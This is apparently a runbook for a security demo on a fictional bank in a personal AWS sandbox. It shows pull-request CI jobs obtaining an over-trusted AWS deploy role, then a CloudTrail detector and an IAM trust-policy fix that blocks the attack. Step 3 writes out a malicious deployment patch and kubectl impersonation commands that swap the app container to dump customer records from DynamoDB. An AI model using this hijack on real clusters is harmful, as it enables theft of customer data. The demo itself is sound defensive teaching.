# Mybank D2 demo

**What this shows and why it matters.** Mybank ships code through GitHub → CI/CD → a private Kubernetes (EKS) cluster. An attacker who steals a developer's AI-coding-agent GitHub token can't merge code, but they can open a pull request — and the automated tests on that PR run *before* anyone reviews it. This demo shows that those PR tests can grab the AWS identity used to deploy the app, and that from there the attacker replaces the app and reads customer records. Then it shows the two things I built to deal with it: a **detection** that catches the credential grab within about a minute, and a **prevention** (an IAM trust-policy change) that stops it outright. Everything is a fictional bank with invented records in my own AWS sandbox. Terraform is used only to *build* the sandbox; the detection and the fix in this demo are applied directly in AWS (CLI / IAM API), matching the GitHub → CI/CD → EKS architecture.

**The identities (so the steps make sense):**
- **Your GitHub account** — the human. You're the developer in Step 1 and the attacker in Step 2. It only touches GitHub.
- **`mybank-sandbox-d2-demo-deploy`** — the AWS *deployment* role. A PR's test job can obtain it. In Kubernetes it maps to the group `mybank:deployers`, which can replace the app. This is "the identity" the attack steals.
- **`mybank-sandbox-app`** — the *app's own* identity; it can read the customer tables. The attacker inherits it by replacing the app.
- **`demo-admin`** — you, the operator/defender, running the demo. Not part of the attack.

**Whose terminal is whose:** the **attacker only ever uses the GitHub website** (opening a PR) — they never have a shell, your repo, or your AWS CLI; their only compute is the GitHub-hosted CI runner they drive through the PR. The **terminal you open is your operator/defender workstation** (the repo checkout, where your cluster-access tooling and the sandbox's address live). You use it to stand the lab up, run the detection, apply the fix — and, in Step 3, to *demonstrate* what the stolen credentials authorize (explained there).

---

## Setup (do this once, before the panel)

1. Open a terminal: in VS Code, **Terminal → New Terminal** (Ctrl+`). It opens PowerShell in the repo folder. Everything below runs there.
2. Sign in (opens a browser; approve as **`demo-admin`**). This is also what fixes the `config profile demo-admin could not be found` error — that error just means you haven't done this yet:
   ```powershell
   .venv/Scripts/python.exe -m scripts.demo.login
   ```
3. Make sure the lab is up (≈20 min if not): `.venv/Scripts/python.exe -m scripts.demo.up`
4. Put the exercise role in its vulnerable state (trusts PR jobs) so the attack can succeed first. This edits the role's trust policy directly in AWS IAM — no Terraform:
   ```powershell
   .venv/Scripts/python.exe -m scripts.d2.set_trust allow-pr
   ```

Keep one browser tab on the GitHub repo. Optional: one AWS console tab signed in as `demo-admin`, region **N. Virginia (us-east-1)**.

---

# Demo

Five steps: a normal deploy, the attacker grabbing the deploy identity, using it to steal data, building the detection, then the fix that blocks the next attempt.

## Step 1 — Legitimate action (a normal, reviewed deploy)

Engineers change code here all day. They edit a file, open a PR, it's reviewed, it merges to `main`, and the trusted pipeline deploys it. This is the baseline — the thing the attacker will abuse.

**Steps to follow:**
1. In the GitHub tab: **Code** → open `app/release.py` → click the **pencil (Edit)**.
2. Change the line to: `RELEASE_NOTE = "hello from the panel"`.
3. **Commit changes…** → **Create a new branch** (name it `release-note`) → **Propose changes** → **Create pull request**.
4. On the PR, open the **Checks** tab — the tests run on GitHub's machines and go **green**.
5. (Optional) Merge it to show it deploy; not required for the demo.

> Say: *"Normal change, normal review. These PR tests run on GitHub's own machines with no AWS access. Only a merge to `main` deploys, and that happens on a private runner."*

## Step 2 — Attacker opens a PR and grabs the deploy identity

Now you're the attacker. You phished a junior developer's AI-coding-agent GitHub token. You can't approve or merge anything — but you can open a PR, and this repo runs tests on PRs before review. You put your own code into a test script so it runs in CI, and see what AWS access that CI job can get.

**Steps to follow:**
1. GitHub → **Code** → open `scripts/d2/demo_probe.py` → **pencil (Edit)**.
2. Change `MARKER = "original-harmless-probe"` to `MARKER = "owned-1"`.
3. **Commit changes…** → **Create a new branch** (name it `agent-cleanup`) → **Propose changes** → title it `Tidy probe output` → **Create pull request**. **Do not merge.**
4. On the PR → **Checks** → open **D2 identity-boundary exercise → identity-probe** → expand the **Execute … identity probe** step. Read the JSON line `obtained_identity: …mybank-sandbox-d2-demo-deploy…`.

> Say: *"A pull request nobody approved just obtained the AWS identity trusted to deploy the bank."*

**Technical explanation of Steps 1–2.** Editing `demo_probe.py` is how attacker-controlled code ends up running in CI — it stands in for any build/test script a PR triggers. When that job runs, it asks GitHub for an OIDC token and calls AWS `sts:AssumeRoleWithWebIdentity`. AWS checks the deploy role's *trust policy*; right now that policy accepts the `pull_request` context (the misconfiguration we're demonstrating), so AWS hands the PR job real deployment credentials. The legitimate path in Step 1 never gets AWS creds because PR checks have no permission to request them — only `main` does.

## Step 3 — Continued exploitation: use the identity to read customer data

**This step is you (the operator) demonstrating what the stolen credentials authorize — not the attacker on their laptop.** Here's why it has to be: the deploy identity's power is to replace the running app, and the app's pods carry an identity allowed to read customer records. But the cluster API is **private**, and the attacker's GitHub-hosted PR runner **cannot reach it** — so their CI job got the credentials but can't use them from where it runs. That network isolation is a real control. To show the *impact* those credentials carry, you act with that identity from inside the network (an in-VPC position an attacker would have in any org whose CI deploys with cluster access). You're not using anything the attacker has; you're showing what their stolen key opens.

**Steps to follow — from scratch, including opening the terminal:**

1. Open a **second terminal** in VS Code (**Terminal → New Terminal**) — this is still your operator workstation. Call this **Terminal A**.
2. Load the repo's AWS session and open a private tunnel to the cluster (paste the whole block):
   ```powershell
   . ./scripts/aws/session.ps1
   $o = Get-Content .cache/outputs.json -Raw | ConvertFrom-Json
   Start-Process -FilePath (Get-Command aws).Source -ArgumentList @('ssm','start-session','--target',$o.operations_instance_id.value,'--document-name','AWS-StartPortForwardingSessionToRemoteHost','--parameters',"host=$($o.cluster_endpoint_hostname.value),portNumber=443,localPortNumber=8443") -WindowStyle Hidden
   Start-Sleep 8
   $env:KUBECONFIG = "$PWD\.cache\kubeconfig"
   aws eks update-kubeconfig --name mybank-sandbox --role-arn arn:aws:iam::404824402451:role/mybank-sandbox-bootstrap --alias mybank | Out-Null
   kubectl config set-cluster arn:aws:eks:us-east-1:404824402451:cluster/mybank-sandbox --server=https://127.0.0.1:8443 --tls-server-name=$($o.cluster_endpoint_hostname.value) | Out-Null
   ```
3. Show the stolen identity's exact powers — it can replace the app, but it can't even read the app's API-key secret:
   ```powershell
   kubectl auth can-i patch deployment/mybank-api -n mybank --as mybank-deployer --as-group mybank:deployers
   kubectl auth can-i get secret/mybank-api    -n mybank --as mybank-deployer --as-group mybank:deployers
   ```
   (First prints `yes`, second prints `no`.)
4. Write the malicious replacement container to a file:
   ```powershell
   @'
   {"spec":{"template":{"spec":{"containers":[{"name":"api","command":["sh","-c","python -c 'import boto3,os,json; c=boto3.client(\"dynamodb\",region_name=os.environ.get(\"AWS_REGION\",\"us-east-1\")); print(\"STOLEN CUSTOMER RECORDS:\"); [print(json.dumps(c.get_item(TableName=os.environ[\"ACCOUNTS_TABLE\"],Key={\"account_id\":{\"S\":a}}).get(\"Item\"))) for a in (\"acct-alice\",\"acct-bob\")]; [print(json.dumps(c.get_item(TableName=os.environ[\"CUSTOMERS_TABLE\"],Key={\"customer_id\":{\"S\":u}}).get(\"Item\"))) for u in (\"cust-alice\",\"cust-bob\")]'; sleep 3600"],"livenessProbe":null,"readinessProbe":null,"startupProbe":null}]}}}}
   '@ | Set-Content -Encoding utf8 .cache/hijack-patch.json
   ```
5. Apply it, acting as the stolen identity, to replace the app:
   ```powershell
   kubectl -n mybank --as mybank-deployer --as-group mybank:deployers patch deployment mybank-api --type strategic --patch-file .cache/hijack-patch.json
   ```
6. Wait for the swapped-in pod, then read what it stole:
   ```powershell
   Start-Sleep 25
   kubectl -n mybank logs -l app.kubernetes.io/name=mybank-api --tail=20
   ```
   You'll see `STOLEN CUSTOMER RECORDS:` then Alice's and Bob's accounts and customer details.
7. Put the real app back:
   ```powershell
   kubectl -n mybank rollout undo deployment/mybank-api
   kubectl -n mybank rollout status deployment/mybank-api
   ```

> Say: *"Deploy access just became customer-data access — names, emails, balances."*

**Technical explanation.** Step 2 opens an SSM port-forward to the cluster's private API (IAM-authenticated, logged, no inbound ports) and points `kubectl` at it — that's how an operator reaches a private cluster, and the position an attacker needs. In Steps 3–5 `--as mybank-deployer --as-group mybank:deployers` is Kubernetes **impersonation**: you act with *exactly* the permissions the stolen identity maps to, nothing more — which is why `can-i get secret` says `no`. The `patch` replaces the app container's command; because the pod keeps the `mybank-api` service account, the new container inherits that account's **Pod Identity** role, which is allowed to `GetItem` from the customer tables. That's the privilege pivot: deploy permission → the app's data permission. `rollout undo` restores the previous (real) container.

## Step 4 — Build the detection and catch it

So far nothing noticed. The detection I built is a small program that reads AWS's own credential-issuance log — CloudTrail's always-on management-event history, through the AWS API, with no extra infrastructure — correlates it with GitHub's run records, and alerts when a *PR* job obtains the deploy identity. It runs outside GitHub, so a compromised PR can't disable it.

**Steps to follow:**
1. (Show the work) Open `scripts/d2/detector.py` in the editor — that's the rule that decides *expected release* vs *PR misuse* vs *denied*. `scripts/d2/collect.py` is what reads CloudTrail and GitHub.
2. Open a **third terminal** in VS Code — call this **Terminal B** — and start the monitor (it loads your read-only GitHub token and runs the detector against the live logs):
   ```powershell
   .venv/Scripts/python.exe -m scripts.demo.watch --minutes 60 --lookback 1
   ```
   Leave it running and visible.
3. Attack again: GitHub → switch to the **`agent-cleanup`** branch (branch dropdown) → open `scripts/d2/demo_probe.py` → **Edit** → change the marker to `MARKER = "owned-2"` → **Commit directly to the `agent-cleanup` branch**.
4. Watch **Terminal B**. Within ~1 minute it prints:
   ```
   pull_request run <N> -> pr_role_misuse
       ALERT (high): Deployment credentials issued to PR validation
   ```

> Say: *"The attack still succeeded — detection isn't prevention — but now security sees it within about a minute, with the role, the run link, and the evidence."*

**Technical explanation.** Committing to the PR branch re-triggers the PR test job (a `synchronize` event), which grabs the identity again — prevention is still off, so AWS still issues it. The monitor correlates two independent records it does not control: AWS's signed `subjectFromWebIdentityToken` (which says the context was `pull_request`) and GitHub's own API record of that run. It classifies the grab as `pr_role_misuse`. It deliberately ignores the role-session name, which the attacker set to look like a release.

## Step 5 — Re-run the attack, now blocked (the prevention)

Same attack as Step 2, but first you apply the fix directly in AWS: tighten the deploy role's trust policy so it only trusts `main`, never pull requests. Then the next PR attempt is refused by AWS before any credential is issued. (No Terraform — this is the change an operator would make to the role in the real architecture.)

**Steps to follow (in Terminal A):**
1. Show the current trust policy — note the `pull_request` line that lets the attack in:
   ```powershell
   .venv/Scripts/python.exe -m scripts.d2.set_trust show
   ```
   (That's a wrapper over `aws iam get-role --role-name mybank-sandbox-d2-demo-deploy --query Role.AssumeRolePolicyDocument`.)
2. Apply the fix — remove PR trust, keeping `main`:
   ```powershell
   .venv/Scripts/python.exe -m scripts.d2.set_trust block-pr
   ```
   It calls `aws iam update-assume-role-policy` and prints the remaining trusted contexts — only `main` push and dispatch. (If the AWS console is open: IAM → Roles → `mybank-sandbox-d2-demo-deploy` → **Trust relationships** → refresh; the `pull_request` line is gone.) Wait ~30 seconds for IAM to propagate.
3. Attack again: GitHub → `agent-cleanup` branch → `scripts/d2/demo_probe.py` → **Edit** → `MARKER = "owned-3"` → **Commit directly to the `agent-cleanup` branch**.
4. On the PR → **Checks** → **identity-probe** now **fails** with `AccessDenied … Not authorized to perform sts:AssumeRoleWithWebIdentity`. **Terminal B** prints `pull_request run <N> -> assumption_denied`.
5. (Optional) Prove normal deploys still work: GitHub → **Actions → Main release → Run workflow → branch `main` → Run workflow** — it succeeds.

> Say: *"Same attack, now refused by AWS before any credential exists — and normal `main` releases still deploy. Detection tells us when something slips; this trust policy stops it."*

**Technical explanation.** `set_trust block-pr` reads the role's live trust policy with the IAM API, drops the `pull_request` subject from its `StringLike` condition, and writes it back with `UpdateAssumeRolePolicy`. Now when the PR job calls `AssumeRoleWithWebIdentity`, AWS sees a `pull_request` subject that no longer matches any allowed pattern and denies it — the job never gets credentials. The `main` patterns are untouched, so the real pipeline is unaffected. This is a change you'd make to the role in IAM (console, CLI, or whatever IaC the team uses); the tool just does it in one step and shows the result.

**Reset after the demo:** `.venv/Scripts/python.exe -m scripts.d2.set_trust allow-pr`, close the `agent-cleanup` PR without merging, and Ctrl+C the monitor in Terminal B.

---

## Teardown (end of the day)

```powershell
.venv/Scripts/python.exe -m scripts.demo.down
```
Removes the runner, closes demo PRs, destroys the lab, and verifies no EKS cluster, instance, NAT gateway or elastic IP remains. State bucket, bootstrap role and budget alert are kept on purpose. At ~USD 0.35/hour you can also just leave it up between rehearsals.

## If something goes wrong

| Symptom | Fix |
| --- | --- |
| `config profile (demo-admin) could not be found` / `ExpiredToken` | Run `.venv/Scripts/python.exe -m scripts.demo.login` (sign in as demo-admin), then retry |
| `Local port 8443 is busy` | `taskkill /F /IM session-manager-plugin.exe`, then re-run the Step 3 terminal block |
| `kubectl` hangs in Terminal A | The tunnel timed out; re-run the Step 3 block |
| Monitor silent after an attack | CloudTrail takes a minute or two; wait. Make sure Terminal B was started before the attack |
| `set_trust block-pr` then attack still succeeds | IAM needs ~30s to propagate; push the next marker change a moment later |
| PR check didn't start | The change must be to `scripts/d2/demo_probe.py` on a branch in this repo (not a fork) |
| EKS console can't show workloads | Sign in as `demo-admin`, not root |

## Likely questions

| Question | Answer |
| --- | --- |
| Did the attacker get customer data? | Yes — Step 3 shows synthetic records coming out. The detection fires at the credential grab, before that stage. |
| Is the attacker a different GitHub user? | No — same account; what differs is the *action* (unreviewed PR vs. reviewed merge to `main`). The detector keys on the credential's **context** (`pull_request` vs `main` run), not the username. |
| Isn't Step 3 cheating — you ran it from your own terminal? | The attacker's real action is the credential grab in Step 2, via GitHub. Step 3 is me demonstrating what those credentials authorize, from inside the network — because the private cluster means a PR runner can't reach it (a control). In an org whose CI deploys with cluster access, the attacker's job runs Step 3 itself. |
| Could they hide with a "release"-looking session name? | No. The monitor uses GitHub's signed subject and run record, never the session name. |
| Why detect if the trust change prevents it? | Defense in depth, and the detector is what *found* the gap. Configs drift; the alert is the early warning. |
| Real-world fix? | Trust deploy roles only from protected `main` (shown live); better, GitOps so CI holds no deploy credentials; and scan Terraform for trust policies that admit `pull_request`. |

Recorded results: [docs/d2/evidence.md](docs/d2/evidence.md). Detection code: [scripts/d2](scripts/d2/README.md). Infrastructure: [infra](infra/README.md).
